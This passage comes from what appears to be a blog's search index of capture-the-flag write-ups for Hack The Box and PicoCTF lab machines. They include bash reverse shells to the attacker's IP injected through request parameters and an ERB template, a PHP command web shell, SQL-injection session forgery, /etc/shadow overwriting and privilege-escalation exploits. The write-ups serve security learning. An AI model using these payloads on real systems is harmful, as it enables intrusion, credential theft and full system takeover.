unsquashfs rootfsParallel unsquashfs: Using 8 processors865 inodes (620 blocks) to write[==========================================================================================================================================================|] 1485/1485 100%created 440 filescreated 45 directoriescreated 187 symlinkscreated 238 devicescreated 0 fifoscreated 0 socketscreated 0 hardlinksgiorgi@darkfears31:~/Desktop/HTB/ONT$ lsfwu_ver hw_ver rootfs squashfs-rootAnd there is the new directory. We have to find the flag in it.grep --include=*.{txt,conf,xml,php} -rnw '.' -e 'HTB' 2&gt;/dev/nullnow this particular command what this will do is check all file if there is any text, config, xml and php files contain the word HTB if there is any that will print it and in the config_default.xml finally found the flag.$ grep --include=*.{txt,conf,xml,php} -rnw '.' -e 'HTB' 2&gt;/dev/null./etc/config_default.xml:244:&lt;Value Name=\"SUSER_PASSWORD\" Value=\"HTB{N0w_Y0u_C4n_L0g1n}\"/&gt;And the flag is:HTB{N0w_Y0u_C4n_L0g1n}" }, { "title": "PhotoBomb from HTB", "url": "/posts/Photobomb-from-HTB/", "categories": "Hack The Box", "tags": "Hack The Box", "date": "2024-09-06 00:00:00 +0000", "snippet": "PhotoBomb from HTBadd this to /etc/hosts10.10.11.182 photobomb.htbThen access the site.Click the only link there is and it will ask for password and username.To find it click CTRL+Uand then go to jsfile. There you will find password and username: document.getElementsByClassName('creds')[0].setAttribute('href','http://pH0t0:b0Mb!@photobomb.htb/printer');pH0t0:b0Mb!here it is.Now click linkand log in.Turn on BurpSuite + Interceptand then choose photo and click download.Modify the request in BurpSuitelike this to get reverse shell:photo=nathaniel-worrell-zK_az6W3xIo-unsplash.jpg&amp;filetype=jpg;bash+-c+'sh+-i+&gt;%26/dev/tcp/&lt;your_ip&gt;/&lt;port&gt; +0&gt;%261';&amp;dimensions=600x400Turn on netcat listenerand then wait for connection.rlwrap nc -nlvp 1234listening on [any] 1234 ...connect to [10.10.16.5] from (UNKNOWN) [10.10.11.182] 56000sh: 0: can't access tty; job control turned off$ script /dev/null -c bashScript started, file is /dev/nullwizard@photobomb:~/photobomb$ sudo -lsudo -lMatching Defaults entries for wizard on photobomb: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/binUser wizard may run the following commands on photobomb: (root) SETENV: NOPASSWD: /opt/cleanup.shRead what the code does and then we get that it resets enviromentand set a new one.Then create an file, name whatever you want and use this commands:echo '/bin/bash' &gt; /tmp/helpchmod +x /tmp/helpsudo PATH=/tmp:$PATH /opt/cleanup.shroot@photobomb:/tmp#You are root now.**Root Flag is: c2586fb0adc030681ba4833377607789**" }, { "title": "Permissions from PicoCTF", "url": "/posts/Permissions-from-PicoCTF/", "categories": "PicoCTF", "tags": "PicoCTF", "date": "2024-09-06 00:00:00 +0000", "snippet": "Permissions from PicoCTFpage DescriptionCan you read files in the root file?The system admin has provisioned an account for you on the main server:ssh -p 64357 picoplayer@saturn.picoctf.netPassword: 33qE7mB5BFCan you login and read the root file? HintsWhat permissions do you have?Let’s connect to ssh and type sudo -l this shows on what root permissions we have on picoplayer:picoplayer@challenge:~$ sudo -l[sudo] password for picoplayer: Matching Defaults entries for picoplayer on challenge: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/binUser picoplayer may run the following commands on challenge: (ALL) /usr/bin/viAnd we see vi text editor. With sudo vi we can create an file with sudo permission and execute it with this code:picoplayer@challenge:~$ sudo vi testand when we open the text editor press esc and then type !/bin/bash to execute it.It will look like this::.!/bin/bashThis will make you root, Head to root directory and then write ls -all and you will see the flag:picoCTF{uS1ng_v1m_3dit0r_3dd6dcf4}" }, { "title": "PermX from HTB", "url": "/posts/PermX-from-HTB/", "categories": "Hack The Box", "tags": "Hack The Box", "date": "2024-09-06 00:00:00 +0000", "snippet": "PermX from HTBpageFirst use nmapon this:$ nmap -sCV --min-rate 4000 10.10.11.23Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-02 18:34 +04Nmap scan report for 10.10.11.23Host is up (0.20s latency).Not shown: 919 filtered tcp ports (no-response), 79 closed tcp ports (conn-refused)PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)| ssh-hostkey:| 256 e2:5c:5d:8c:47:3e:d8:72:f7:b4:80:03:49:86:6d:ef (ECDSA)|_ 256 1f:41:02:8e:6b:17:18:9c:a0:ac:54:23:e9:71:30:17 (ED25519)80/tcp open http Apache httpd 2.4.52|_http-title: Did not follow redirect to http://permx.htb|_http-server-header: Apache/2.4.52 (Ubuntu)Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernelThen try to access to website with IP and you will get the sites name, then add it to /etc/hosts:10.10.11.23 permx.htbThen for directory discovery use gobusterbut you will not need that. You will need ffuf: ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u http://10.10.11.23/ -H \"Host: FUZZ.permx.htb\" -mc 200 -sThis will display this two subdomains:wwwlmsYou are currently in wwwso you will need to head to lmssubdomain. To do that you will need to first add that to /etc/hosts:10.10.11.23 lms.permx.htbAfter checking out the site with whatwebcommand you can find that site runs on chamilo 1:$ whatweb http://lms.permx.htbhttp://lms.permx.htb [200 OK] Apache[2.4.52], Bootstrap, Chamilo[1], Cookies[GotoCourse,ch_sid], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.52 (Ubuntu)], HttpOnly[GotoCourse,ch_sid], IP[10.10.11.23], JQuery, MetaGenerator[Chamilo 1], Modernizr, PasswordField[password], PoweredBy[Chamilo], Script, Title[PermX - LMS - Portal], X-Powered-By[Chamilo 1], X-UA-Compatible[IE=edge]After searching chamilo 1exploits i got to this github repository and downloaded it:git clone https://github.com/m3m0o/chamilo-lms-unauthenticated-big-upload-rce-pocgit clone https://github.com/m3m0o/chamilo-lms-unauthenticated-big-upload-rce-pocpip install -r requirements.txtpython3 main.py -u http://lms.permx.htb/ -a scanpython3 main.py -u http://lms.permx.htb/ -a webshellpython3 main.py -u http://lms.permx.htb/ -a revshellBefore running the last command be sure to run$ nc -nlvp 1234and you will get the connection.You will need to find password to connect to sshand to find that i searched for configuration.phpfiles with this command:/var/www/chamilo $ find . -type f -name \"configuration.php\"You will get two files:./www/chamilo/app/config/configuration.php./www/chamilo/plugin/sepe/src/configuration.phpThe password is hidden in ./www/chamilo/app/config/configuration.phpso catit and find the password:// Database connection settings.$_configuration['db_host'] = 'localhost';$_configuration['db_port'] = '3306';$_configuration['main_database'] = 'chamilo';$_configuration['db_user'] = 'chamilo';$_configuration['db_password'] = '03F6lY3uXAP2bkW8';// Enable access to database management for platform admins.$_configuration['db_manager_enabled'] = false;db_password —- 03F6lY3uXAP2bkW8Then search for this:www-data@permx:/var$ cat /etc/passwd | grep -i sh$ cat /etc/passwd | grep -i sh$root:x:0:0:root:/root:/bin/bashmtz:x:1000:1000:mtz:/home/mtz:/bin/bashSo we have to connect to sshwith this name and passowrd:$ ssh mtz@10.10.11.23mtz@10.10.11.23's password: 03F6lY3uXAP2bkW8Welcome to Ubuntu 22.04.4 LTS (GNU/Linux 5.15.0-113-generic x86_64) * Documentation: https://help.ubuntu.com * Management: https://landscape.canonical.com * Support: https://ubuntu.com/pro System information as of Fri Aug 2 03:16:24 PM UTC 2024 System load: 0.22 Usage of /: 59.0% of 7.19GB Memory usage: 10% Swap usage: 0% Processes: 249 Users logged in: 0 IPv4 address for eth0: 10.10.11.23 IPv6 address for eth0: dead:beef::250:56ff:feb0:96fExpanded Security Maintenance for Applications is not enabled.0 updates can be applied immediately.Enable ESM Apps to receive additional future security updates.See https://ubuntu.com/esm or run: sudo pro statusThe list of available updates is more than a week old.To check for new updates run: sudo apt updateLast login: Mon Jul 1 13:09:13 2024 from 10.10.14.40mtz@permx:~$You can cat the user.txt:mtz@permx:~$ cat user.txt1af9641f8b71a4d3898cc89fd44a0432after that run sudo -lto learn what you can run with sudopermissions:Matching Defaults entries for mtz on permx:env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin, use_ptyUser mtz may run the following commands on permx: (ALL : ALL) NOPASSWD: /opt/acl.shThen create symlink to /etc/shadowsin /home/mtz/directory and name whatever you want:$ openssl passwd -6 -salt uwu Password123$$6$uwu$GkLbKwoRGN66KFTWszadPgA0dG0hymftio/bqBSxX472cgLFwInxremvld1RHRRFup./tjJho66wlmVBSIf/u0mtz@permx:~$ ln -f -s /etc/shadow ./giunamtz@permx:~$ sudo /opt/acl.sh mtz rwx /home/mtz/giunamtz@permx:~$ nano giunaWhile in nano text editoryou can either change the rootpassword or add a new user with root capabilities. For me i changed the rootpassword.$ su -Password: root@permx:~# lsbackup reset.sh root.txtroot@permx:~# cat root.txt83a46ac2b9985c0e7029e97288cf01d2And there is the rooot.txt: 83a46ac2b9985c0e7029e97288cf01d2" }, { "title": "Perfection from HTB", "url": "/posts/Perfection-from-HTB/", "categories": "Hack The Box", "tags": "Hack The Box", "date": "2024-09-06 00:00:00 +0000", "snippet": "Perfection from HTBpageNmapgave this:$ nmap -sCV --min-rate 4000 10.10.11.253Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-07 17:20 +04Nmap scan report for 10.10.11.253Host is up (0.29s latency).Not shown: 931 filtered tcp ports (no-response), 67 closed tcp ports (conn-refused)PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)| ssh-hostkey:| 256 80:e4:79:e8:59:28:df:95:2d:ad:57:4a:46:04:ea:70 (ECDSA)|_ 256 e9:ea:0c:1d:86:13:ed:95:a9:d0:0b:c8:22:e4:cf:e9 (ED25519)80/tcp open http nginx|_http-title: Weighted Grade CalculatorService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelNothing unusual.Access the site and then go to Calculate your weighted grade. We have to modify something with BurpSuite.Turn on BurpSuiteand Intercept. Go to the site and submit it:![](/assets//images/Screenshot from 2024-08-07 17-25-48.png]]Submit it and try to modify it with Intercept:category1= &lt;%25%2d+%22&gt;1&amp;grade1=20&amp;weight1=20&amp;category2=2&amp;grade2=20&amp;weight2=20&amp;category3=3&amp;grade3=20&amp;weight3=20&amp;category4=4&amp;grade4=20&amp;weight4=20&amp;category5=5&amp;grade5=20&amp;weight5=20&lt;%25%2d+%22&gt;i added this and site displayed this : So we can add some codes to mess with it.For first try send it to Repeater, use this command and url encodeit with burpsuite.&lt;%= IO.popen(\"sleep 10\").readlines() %&gt;1 # url encode it with CTRL+u&lt;%25%3d+IO.popen(\"sleep+10\").readlines()+%25&gt;1note that 1 is category name and don't need encoding.This code should make site sleep for 10 seconds. If request is delayed for 10 seconds that means this code worked.As expected it returned after 10 seconds.Now we need reverse shellto access the machine. we’ll use this code:&lt;%= IO.popen(\"bash -c 'bash -i &gt;&amp; /dev/tcp/&lt;your_ip&gt;/&lt;port&gt; 0&gt;&amp;1'\").readlines() %&gt; # url encode it&lt;%25%3d+IO.popen(\"bash+-c+'bash+-i+&gt;%26+/dev/tcp/10.10.16.3/1234+0&gt;%261'\").readlines()+%25&gt;It should look like this:category1=&lt;%25%3d+IO.popen(\"bash+-c+'bash+-i+&gt;%26+/dev/tcp/10.10.16.3/1234+0&gt;%261'\").readlines()+%25&gt;1Open port with NetCatand wait for the connection after clicking send.nc -nlvp 1234listening on [any] 1234 ...connect to [10.10.16.3] from (UNKNOWN) [10.10.11.253] 40564sh: 0: can't access tty; job control turned off$ lsmain.rbpublicviews$ script /dev/null -c bashScript started, output log file is '/dev/null'. # to get shell$ cat /home/susan/user.txt7e3540188bf162aefb968d344a6bad4dUser Flag is : 7e3540188bf162aefb968d344a6bad4d***Check for mailin /var/maildirectory and read it.$ cat susancat susanDue to our transition to Jupiter Grades because of the PupilPath data breach, I thought we should also migrate our credentials ('our' including the other studentsin our class) to the new platform. I also suggest a new password specification, to make things easier for everyone. The password format is:{firstname}_{firstname backwards}_{randomly generated integer between 1 and 1,000,000,000}Note that all letters of the first name should be convered into lowercase.Please hit me with updates on the migration when you can. I am currently registering our university with the platform.- Tina, your delightful studentOur user is susanand according to mail our password should start with susan_nasusand some number.When you type idin terminal you see this:susan@perfection:~$ id uid=1001(susan) gid=1001(susan) groups=1001(susan),27(sudo)We see that the user susan is in the sudogroup. Since sudo requires a password, we need to find the password for the susan user. Go to /home/susanand you can find file named Migration:susan@perfection: cd Migration/susan@perfection:~/Migration$ lspupilpath_credentials.dbsusan@perfection:~/Migration$ file pupilpath_credentials.dbpupilpath_credentials.db: SQLite 3.x databasesqlite3 pupilpath_credentials.dbSQLite version 3.37.2 2022-01-06 13:25:41Enter \".help\" for usage hints.sqlite&gt; .tables.tablesuserssqlite&gt; select * from users;select * from users;1|Susan Miller|abeb6f8eb5722b8ca3b45f6f72a0cf17c7028d62a15a30199347d9d74f39023f2|Tina Smith|dd560928c97354e3c22972554c81901b74ad1b35f726a11654b78cd6fd8cec573|Harry Tyler|d33a689526d49d32a01986ef5a1a3d2afc0aaee48978f06139779904af7a63934|David Lawrence|ff7aedd2f4512ee1848a3e18f86c4450c1c76f5c6e27cd8b0dc05557b344b87a5|Stephen Locke|154a38b253b4e08cba818ff65eb4413f20518655950b9a39964c18d7737d9bb8Save this hash abeb6f8eb5722b8ca3b45f6f72a0cf17c7028d62a15a30199347d9d74f39023fand with hash-identifieridentify hash type. It is sha-512.password should start with susan_nasus_ save that to file e.g. helpsave hash to file e.g. hashand run the command:hashcat -m 1400 -a 6 hash help ?d?d?d?d?d?d?d?d?d -O-m 1400 : Specifies the hash type, in this case, SHA-256.-a 6 : Specifies the attack mode, in this case, a combinator attack where each candidate in the keyspace is appended to each word in the wordlist.hash : The file containing the hash to be cracked.help : The wordlist file containing the prefix susan_nasus_ .?d?d?d?d?d?d?d?d?d : The mask representing all combinations of 9 digits.-O : Optimized kernel (useful for speed but may have restrictions).And the cracked password is: susan_nasus_413759210After that become the root:$ sudo -isudo -i[sudo] password for susan: susan_nasus_413759210root@perfection:~# cat root.txtcat root.txt854f91d2002cf7e31b4df4359c70a336Root Flag is: 854f91d2002cf7e31b4df4359c70a336***" }, { "title": "Paper from HTB", "url": "/posts/Paper-from-HTB/", "categories": "Hack The Box", "tags": "Hack The Box", "date": "2024-09-06 00:00:00 +0000", "snippet": "Paper from HTBnmapgave thisPORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 8.0 (protocol 2.0)| ssh-hostkey:| 2048 10:05:ea:50:56:a6:00:cb:1c:9c:93:df:5f:83:e0:64 (RSA)| 256 58:8c:82:1c:c6:63:2a:83:87:5c:2f:2b:4f:4d:c3:79 (ECDSA)|_ 256 31:78:af:d1:3b:c4:2e:9d:60:4e:eb:5d:03:ec:a0:22 (ED25519)24/tcp filtered priv-mail80/tcp open http Apache httpd 2.4.37 ((centos) OpenSSL/1.1.1k mod_fcgid/2.3.9)| http-methods:|_ Potentially risky methods: TRACE|_http-server-header: Apache/2.4.37 (centos) OpenSSL/1.1.1k mod_fcgid/2.3.9|_http-generator: HTML Tidy for HTML5 for Linux version 5.7.28|_http-title: HTTP Server Test Page powered by CentOS443/tcp open ssl/http Apache httpd 2.4.37 ((centos) OpenSSL/1.1.1k mod_fcgid/2.3.9)|_http-title: HTTP Server Test Page powered by CentOS| tls-alpn:|_ http/1.1|_ssl-date: TLS randomness does not represent time|_http-server-header: Apache/2.4.37 (centos) OpenSSL/1.1.1k mod_fcgid/2.3.9|_http-generator: HTML Tidy for HTML5 for Linux version 5.7.28| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=Unspecified/countryName=US| Subject Alternative Name: DNS:localhost.localdomain| Not valid before: 2021-07-03T08:52:34|_Not valid after: 2022-07-08T10:32:34| http-methods:|_ Potentially risky methods: TRACEAccess the site and at the bottom we find that site runs on wordpressand with wpscanwe find that version is 5.2.3which is exploitable. you just need to add /?static=1which will show you all things without logging in.I got this texttestMicheal please remove the secret from drafts for gods sake!Hello employees of Blunder Tiffin,Due to the orders from higher officials, every employee who were added to this blog is removed and they are migrated to our new chat system.So, I kindly request you all to take your discussions from the public blog to a more private chat system.-Nick# Warning for MichaelMichael, you have to stop putting secrets in the drafts. It is a huge security issue and you have to stop doing it. -NickThreat Level MidnightA MOTION PICTURE SCREENPLAY,WRITTEN AND DIRECTED BYMICHAEL SCOTT[INT:DAY]Inside the FBI, Agent Michael Scarn sits with his feet up on his desk. His robotic butler Dwigt….# Secret Registration URL of new Employee chat systemhttp://chat.office.paper/register/8qozr226AhkCHZdyY# I am keeping this draft unpublished, as unpublished drafts cannot be accessed by outsiders. I am not that ignorant, Nick.# Also, stop looking at my drafts. Jeez!Here we see subdomain so lets add it to /etc/hosts10.10.11.143 chat.office.paperAccess that subdomain. It is an login page, but with this link we can create new user# Secret Registration URL of new Employee chat systemhttp://chat.office.paper/register/8qozr226AhkCHZdyYUse that link and create new user. After logging in you will see general chatwhere is added bot --- recyclopsyou can’t write in that channel so send direct message to him.- recyclops help------------------------------------------------------- 3. Files:- eg: 'recyclops get me the file test.txt', or 'recyclops could you send me the file sale/secret.xls' or just 'recyclops file test.txt'- 4. List:- You can ask me to list the files- eg: 'recyclops i need directory list sale' or just 'recyclops list sale'This is needed.- list- Fetching the directory listing of /sales/- total 0 drwxr-xr-x 4 dwight dwight 32 Jul 3 2021 . drwx------ 11 dwight dwight 281 Feb 6 2022 .. drwxr-xr-x 2 dwight dwight 27 Sep 15 2021 sale drwxr-xr-x 2 dwight dwight 27 Jul 3 2021 sale_2Nothing is in this directories. bot says that he can only list and read in that directory but doesn't say he can't read in other directory from there- list .. Fetching the directory listing of ..- total 32 drwx------ 11 dwight dwight 281 Feb 6 2022 . drwxr-xr-x. 3 root root 20 Jan 14 2022 .. lrwxrwxrwx 1 dwight dwight 9 Jul 3 2021 .bash_history -&gt; /dev/null -rw-r--r-- 1 dwight dwight 18 May 10 2019 .bash_logout -rw-r--r-- 1 dwight dwight 141 May 10 2019 .bash_profile -rw-r--r-- 1 dwight dwight 358 Jul 3 2021 .bashrc -rwxr-xr-x 1 dwight dwight 1174 Sep 16 2021 bot_[restart.sh](http://restart.sh/) drwx------ 5 dwight dwight 56 Jul 3 2021 .config -rw------- 1 dwight dwight 16 Jul 3 2021 .esd_auth drwx------ 2 dwight dwight 44 Jul 3 2021 .gnupg drwx------ 8 dwight dwight 4096 Sep 16 2021 hubot -rw-rw-r-- 1 dwight dwight 18 Sep 16 2021 .hubot_history drwx------ 3 dwight dwight 19 Jul 3 2021 .local drwxr-xr-x 4 dwight dwight 39 Jul 3 2021 .mozilla drwxrwxr-x 5 dwight dwight 83 Jul 3 2021 .npm drwxr-xr-x 4 dwight dwight 32 Jul 3 2021 sales drwx------ 2 dwight dwight 6 Sep 16 2021 .ssh -r-------- 1 dwight dwight 33 Aug 18 09:00 user.txt drwxr-xr-x 2 dwight dwight 24 Sep 16 2021 .vimthere is an hubotwhich if we search stores passwordin /hubot/.env So let’s read it.file ../hubot/.env- &lt;!=====Contents of file ../hubot/.env=====&gt;- export ROCKETCHAT_URL='[http://127.0.0.1:48320](http://127.0.0.1:48320/)' export ROCKETCHAT_USER=recyclops export ROCKETCHAT_PASSWORD=Queenofblad3s!23 export ROCKETCHAT_USESSL=false export RESPOND_TO_DM=true export RESPOND_TO_EDITED=true export PORT=8000 export BIND_ADDRESS=127.0.0.1- &lt;!=====End of file ../hubot/.env=====&gt;We have the password. Now let’s read /etc/passwdso we know which user has this passwordfile ../../../etc/passwdrocketchat❌1001:1001::/home/rocketchat:/bin/bashdwight❌1004:1004::/home/dwight:/bin/bashAfter trying to log in as rocketchati can’t so its dwightwe will use Username dwightPassword Queenofblad3s!23ssh dwight@10.10.11.143password:User Flag is: 8c4b2e8917b943aa84d10221fa78bd5f***Then download linpeas.shon that machine and run it.With that we learn that sudo version --- 1.8.29which is exploitablehttps://github.com/secnigma/CVE-2021-3560-Polkit-Privilege-Esclation/blob/main/poc.shThis is the code we will use.I set the Username shavigioPassword shavigioand ran this code many times until you get something like this:[dwight@paper ~]$ ./polkit_privilege_escalation.sh[!] Username set as : shavigio[!] No Custom Timing specified.[!] Timing will be detected Automatically[!] Force flag not set.[!] Vulnerability checking is ENABLED![!] Starting Vulnerability Checks...[!] Checking distribution...[!] Detected Linux distribution as \"centos\"[!] Checking if Accountsservice and Gnome-Control-Center is installed[+] Accounts service and Gnome-Control-Center Installation Found!![!] Checking if polkit version is vulnerable[+] Polkit version appears to be vulnerable!![!] Starting exploit...[!] Inserting Username shavigio...Error org.freedesktop.Accounts.Error.PermissionDenied: Authentication is required[+] Inserted Username shavigio with UID 1005![!] Inserting password hash...[!] It looks like the password insertion was succesful![!] Try to login as the injected user using su - shavigio[!] When prompted for password, enter your password[!] If the username is inserted, but the login fails; try running the exploit again.[!] If the login was succesful,simply enter 'sudo bash' and drop into a root shellWithout any errorsThen switch user like thissu - shavigiopassword:[shavigio@paper ~]$ sudo bashWe trust you have received the usual lecture from the local SystemAdministrator. It usually boils down to these three things: #1) Respect the privacy of others. #2) Think before you type. #3) With great power comes great responsibility.[sudo] password for shavigio:[root@paper shavigio]#Root Flag is: 5c684c62005aaba6f5d271c1b525f546***" }, { "title": "Pandora from HTB", "url": "/posts/Pandora-from-HTB/", "categories": "Hack The Box", "tags": "Hack The Box", "date": "2024-09-06 00:00:00 +0000", "snippet": "Pandora from HTBnmapgave this: sudo nmap -sU --min-rate=4000 -T4 10.10.11.136Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-20 14:10 +04Nmap scan report for 10.10.11.136Host is up (0.25s latency).Not shown: 991 open|filtered udp ports (no-response)PORT STATE SERVICE161/udp open snmp nmap -sCV --min-rate 4000 -p- 10.10.11.136Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-20 14:00 +04PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)| ssh-hostkey:| 3072 24:c2:95:a5:c3:0b:3f:f3:17:3c:68:d7:af:2b:53:38 (RSA)| 256 b1:41:77:99:46:9a:6c:5d:d2:98:2f:c0:32:9a:ce:03 (ECDSA)|_ 256 e7:36:43:3b:a9:47:8a:19:01:58:b2:bc:89:f6:51:08 (ED25519)80/tcp open http Apache httpd 2.4.41 ((Ubuntu))|_http-server-header: Apache/2.4.41 (Ubuntu)Then use snmpwalksnmpwalk -v 1 -c public 10.10.11.136after long ass waitiso.3.6.1.2.1.25.4.2.1.5.1004 = STRING: \"-k start\"iso.3.6.1.2.1.25.4.2.1.5.1005 = STRING: \"-k start\"\tiso.3.6.1.2.1.25.4.2.1.5.1101 = STRING: \"-u daniel -p HotelBabylon23\"iso.3.6.1.2.1.25.4.2.1.5.1140 = STRING: \"-k start\"iso.3.6.1.2.1.25.4.2.1.5.1142 = STRING: \"-k start\"With this i can login in sshssh daniel@10.10.11.136daniel@10.10.11.136's password:Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-91-generic x86_64)daniel@pandora:~$reading this file tells me that /var/www/pandorais being served on 80 portcat /etc/apache2/sites-enabled/pandora.conf&lt;VirtualHost localhost:80&gt; ServerAdmin admin@panda.htb ServerName pandora.panda.htb DocumentRoot /var/www/pandora AssignUserID matt matt &lt;Directory /var/www/pandora&gt; AllowOverride All &lt;/Directory&gt; ErrorLog /var/log/apache2/error.log CustomLog /var/log/apache2/access.log combined&lt;/VirtualHost&gt;forwarded port and accessed it:ssh -L 8000:127.0.0.1:80 daniel@10.10.11.136Then accessed site and found version, which is exploitable. With sql-injectioni found PHSESSIDsudo sqlmap --url=\"http://localhost:8000/pandora_console/include/chart_generator.php?session_id=''\" --current-db --batch[14:54:39] [INFO] retrieved: 'pandora'current database: 'pandora'Then listed tablesin that databasesudo sqlmap --url=\"http://localhost:8000/pandora_console/include/chart_generator.php?session_id=''\" -D pandora --tables --batch| tservice_element || tsesion || tsesion_extended || tsessions_php || tskin |to get session_idwe need tsession_phptable sudo sqlmap --url=\"http://localhost:8000/pandora_console/include/chart_generator.php?session_id=''\" -D pandora -T tsessions_php --dump --batch| g0kteepqaj1oep6u7msp0u38kv | id_usuario|s:6:\"daniel\";| g4e01qdgk36mfdh90hvcc54umq | id_usuario|s:4:\"matt\";alert_msg|a:0:{}new_chat|b| gf40pukfdinc63nm5lkroidde6 | NULLWe need matt's session id.then access the site with this:http://localhost:8000/pandora_console/include/chart_generator.php?session_id=g4e01qdgk36mfdh90hvcc54umqto become the adminhttp://localhost:8000/pandora_console/include/chart_generator.php?session_id=1%27%20union%20select%201,2,%27id_usuario|s:5:%22admin%22;%27%20--%20-Then open another taband go to that port you will be adminNow you can upload files.I uploaded php cmdon site and got `cmd&lt;?phpsystem($_REQUEST['cmd']);?&gt;Then accessed the cmdwith this link/images/php-shell.php?cmd=idTo get reverse shell upload reverse shell fileand with cmdexecute it# reverse.sh#!/bin/bashbash -c 'bash -i &gt;&amp; /dev/tcp/&lt;ip&gt;/&lt;port&gt; 0&gt;&amp;1'upload it and with cmd type:/images/php-shell.php?cmd= bash reverse.shThen you will get netcatconnectionrlwrap nc -nlvp 1234listening on [any] 1234 ...connect to [10.10.16.6] from (UNKNOWN) [10.10.11.136] 45852matt@pandora:/var/www/pandora/pandora_console/images$ ididuid=1000(matt) gid=1000(matt) groups=1000(matt)User Flag is: b2c37562ccacb9f6a9f6a66a05898fe2***Let us find all the files with SUID bit set in the whole file system using the find utility with the:$ find / -perm -4000 2&gt;/dev/null/usr/bin/pandora_backupTo run that program we must escape the restricted shell which code we can find on GTFOshells$ echo \"/bin/sh &lt;$(tty) &gt;$(tty) 2&gt;$(tty)\" | at now; tail -f /dev/nullThis will make us able to run the program.Now to see what this program does we must use stringsonto it.We don’t have stringson machine so we must download it with ncnc &lt;your_ip&gt; &lt;port&gt; &lt; /usr/bin/pandora_backup # on machinenc -nlvp &lt;port&gt; &gt; pandora_backup # on your local machineAfter downloading that file run strings onto it and we are able to find that it uses tarwith relative pathso it can be exploited to grant us root shellgo to machine and set $PATH variable toexport PATH=/home/matt:$PATHThen in /home/mattcreate file either for netcat connection$ echo -n '#!/bin/bash bash -i &gt;&amp; /dev/tcp/&lt;yourIP&gt;/&lt;PORT&gt; 0&gt;&amp;1' &gt; tar$ chmod +x tar$ pandora_backupThen you will get connection on ncnc -nlvp 1235listening on [any] 1235 ...connect to [10.10.16.6] from (UNKNOWN) [10.10.11.136] 47902bash: cannot set terminal process group (836): Inappropriate ioctl for devicebash: no job control in this shellroot@pandora:/home/matt# ididuid=0(root) gid=1000(matt) groups=1000(matt)Root Flag is: f0e230f1810a9f5ca79dd2720ea7edb3***" }, { "title": "Packer from PicoCTF", "url": "/posts/Packer-from-PicoCTF/", "categories": "PicoCTF", "tags": "PicoCTF", "date": "2024-09-06 00:00:00 +0000", "snippet": "Packer from PicoCTFPagegiorgi@darkfears31:~/Desktop$ strings out | headUPX!@P/PI}_PzHF^lx/Bf/P@/ jME=n[GSd2t&gt;d48%' UPX is a free, secure, portable, extendable, high-performance executable packer for several executable formats.UPX is an advanced executable file compressor. UPX will typically reduce the file size of programs and DLLs by around 50%-70%, thus reducing disk space, network load times, download times and other distribution and storage costs.Ultimate Packer for eXecutables Copyright (C) 1996 - 2024UPX 4.2.2 Markus Oberhumer, Laszlo Molnar &amp; John Reiser Jan 3rd 2024Usage: upx [-123456789dlthVL] [-qvfk] [-o file] file..Commands: -1 compress faster -9 compress better -d decompress -l list compressed file -t test compressed file -V display version number -h give more help -L display software licenseOptions: -q be quiet -v be verbose -oFILE write output to 'FILE' -f force compression of suspicious files -k keep backup filesfile.. executables to (de)compressType 'upx --help' for more detailed help.UPX comes with ABSOLUTELY NO WARRANTY; for details visit https://upx.github.iogiorgi@darkfears31:~/Desktop$ upx -d out Ultimate Packer for eXecutables Copyright (C) 1996 - 2024UPX 4.2.2 Markus Oberhumer, Laszlo Molnar &amp; John Reiser Jan 3rd 2024 File size Ratio Format Name -------------------- ------ ----------- -----------upx: out: NotPackedException: not packed by UPXUnpacked 1 files.giorgi@darkfears31:~/Desktop$ strings out | grep pico #gave nothinggiorgi@darkfears31:~/Desktop$ strings out | grep flagPassword correct, please see flag: 7069636f4354467b5539585f556e5034636b314e365f42316e34526933535f33373161613966667d(mode_flags &amp; PRINTF_FORTIFY) != 0WARNING: Unsupported flag value(s) of 0x%x in DT_FLAGS_1.version == NULL || !(flags &amp; DL_LOOKUP_RETURN_NEWEST)flag.c_dl_x86_hwcap_flags_dl_stack_flagsEncoded Flag is :7069636f4354467b5539585f556e5034636b314e365f42316e34526933535f33373161613966667dIn CyberChef we can decode flag and see that its : ==picoCTF{U9X_UnP4ck1N6_B1n4Ri3S_371aa9ff}==" }, { "title": "Pw-Crack-5 from PicoCTF", "url": "/posts/PW-Crack-5-from-PicoCTF/", "categories": "PicoCTF", "tags": "PicoCTF", "date": "2024-09-06 00:00:00 +0000", "snippet": "Pw-Crack-5 from PicoCTFpage DescriptionCan you crack the password to get the flag?Download the password checker here and you’ll need the encrypted flag and the hash in the same directory too. Here’s a dictionary with all possible passwords based on the password conventions we’ve seen so far. Hint 2You may need to trim the whitespace from the dictionary word before hashing. Look up the Python string function, stripI’m tired so i can’t really explain so code should look like this:import hashlib ### THIS FUNCTION WILL NOT HELP YOU FIND THE FLAG --LT ########################def str_xor(secret, key):#extend key to secret lengthnew_key = keyi = 0while len(new_key) &lt; len(secret):new_key = new_key + key[i]i = (i + 1) % len(key)return \"\".join([chr(ord(secret_c) ^ ord(new_key_c)) for (secret_c,new_key_c) in zip(secret,new_key)])############################################################################### flag_enc 